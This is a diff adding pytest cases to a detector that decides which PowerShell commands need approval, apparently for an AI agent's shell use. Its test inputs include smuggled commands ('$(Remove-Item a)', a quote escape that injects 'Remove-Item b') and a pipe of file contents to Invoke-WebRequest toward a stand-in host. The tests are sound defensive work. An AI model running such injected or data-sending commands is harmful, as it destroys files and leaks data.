@@ -95,3 +95,33 @@ def test_code_that_could_do_more_than_read_still_asks(command):
 ])
 def test_other_reads_run_without_an_approval(command):
     assert _flagged_on_a_turn(command) is False
+
+
+#: RT-FU-A-READ-ONLY-SELECT-STRING-STILL-ASKS-FOR-APPROVAL: the helper's read of its own test log,
+#: as ``command_full`` recorded it on 2026-11-21 (events.jsonl 05:22:49Z), its path shortened but its
+#: hyphenated folder kept. Double-quoted text was scanned as code, so the pattern's ``|`` read as a pipe
+#: into commands ``Expected``, ``Some``, ``diff``… and ``EterniaLauncher-worktrees`` as a cmdlet.
+#: Killing mutation (recorded in the landing commit): make ``_quoted_as_data`` return double-quoted
+#: text unchanged -> this case reds.
+SELECT_STRING = (
+    r"""powershell.exe -NoProfile -Command '$p="X:\w\EterniaLauncher-worktrees\w1121a-topbarpic\before.log"; """
+    r"""Select-String -Path $p -Pattern "\[E\]|Expected:|Actual:|Which:|Some tests failed|Failing tests|EXIT=|diff|golden|Image" """
+    r"""-Context 1,2 | Select-Object -Last 180'"""
+)
+
+
+def test_a_select_string_read_of_a_log_runs_without_an_approval_on_a_chat_turn():
+    assert _flagged_on_a_turn(SELECT_STRING) is False
+    assert detect_dangerous_command(SELECT_STRING)[0] is True  # off a harness turn: upstream's rule
+
+
+@pytest.mark.parametrize("command", [
+    "powershell -NoProfile -Command 'Select-String -Path \"a\" -Pattern \"x|y\" | Out-File \"b\"'",
+    "powershell -NoProfile -Command 'Get-Content \"a\" | Set-Content \"b\"'",
+    "powershell -NoProfile -Command 'Select-String -Path \"a\" -Pattern \"x\" > \"b\"'",
+    "powershell -NoProfile -Command 'Select-String -Path \"$(Remove-Item a)\" -Pattern x'",
+    "powershell -NoProfile -Command 'Select-String -Path \"a`\"; Remove-Item b; `\"\" -Pattern x'",
+    "powershell -NoProfile -Command 'Select-String -Path \"a\" -Pattern x | Invoke-WebRequest -Uri \"http://h\"'",
+])
+def test_quoted_text_is_data_but_what_writes_or_calls_out_still_asks(command):
+    assert _flagged_on_a_turn(command) is True
